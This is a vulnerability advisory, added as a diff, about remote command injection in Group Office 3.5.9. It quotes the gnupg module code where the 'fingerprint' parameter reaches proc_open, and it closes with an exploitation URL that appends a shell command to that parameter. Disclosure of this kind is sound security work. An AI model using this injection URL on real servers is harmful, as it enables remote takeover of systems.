@@ -1,0 +1,63 @@
+# Title
+Group Office Remote Command Execution Vulnerability
+
+# Author
+ADEO Security
+
+# Published
+16/07/2010
+
+# Version
+3.5.9 (Possible all versions)
+
+# Vendor
+http://www.group-office.com
+
+# Download
+http://sourceforge.net/projects/group-office/files/3.5/groupoffice-com-3.5.9.tar.gz/download
+
+# Description
+"Take your office online with Group-Office groupware. Share projects,
+calendars, files and e-mail online with co-workers and clients. Easy
+to use and fully customizable, Group-Office takes online collaboration
+to the next level."
+
+# Credit
+Vulnerability founded by Canberk BOLAT
+	- Mail: security[AT]adeo.com.tr
+	- Web: http://security.adeo.com.tr , http://adeosecuritylabs.com
+
+# Vulnerability
+Remote attacker can execute commands on the system that host target
+web application. Its high level vulnerability. Attacker needs gnupg
+module that installed.
+
+modules/gnupg/json.php:
+$data = $gnupg->export($_REQUEST['fingerprint']);
+
+
+In json.php export method called with HTTP Request that's name
+fingerprint. In the export method, variable $fingerprint passed to
+run_cmd method.
+
+modules/gnupg/classes/gnupg.class.inc.php:
+public function export($fingerprint)
+{
+	$this->run_cmd('--armor --export '.$fingerprint, $key);
+...
+private function run_cmd($cmd, &$output=null, &$errorcode=null,
+$data=null, $passphrase=null, $background=false)
+{
+...
+	$complete_cmd .= ' '.$cmd;
+...
+$p = proc_open($complete_cmd,$this->fd, $this->pipes);
+...
+
+'complete_cmd' variable executed by application and if attacker
+manipulate request 'fingerprint' application executes attackers
+malicious codes.
+
+
+# Exploitation
+http://server/groupoffice/modules/gnupg/json.php?task=send_key&fingerprint=xyz;COMMAND
